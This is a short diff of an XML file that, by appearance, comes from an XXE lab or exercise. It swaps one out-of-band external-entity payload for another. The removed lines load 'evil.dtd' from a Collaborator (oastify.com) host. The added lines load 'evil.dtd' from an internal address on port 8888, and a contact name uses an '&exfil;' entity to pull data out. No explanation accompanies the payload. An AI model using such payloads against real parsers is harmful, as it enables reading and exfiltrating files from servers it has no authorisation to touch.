@@ -1,9 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!-- Fetch the external DTD from your Collaborator payload -->
-  <!ENTITY % remote SYSTEM "http://vhgnmo56w5nexzuxl6rjl83uqlwek88x.oastify.com/evil.dtd">
-  %remote;
-]>
+<?xml-stylesheet type="text/xsl" href="/contact.xsl"?>
+<!DOCTYPE contacts SYSTEM "http://192.168.0.240:8888/evil.dtd">
 <contacts>
     <contact>
         <name>&exfil;</name>
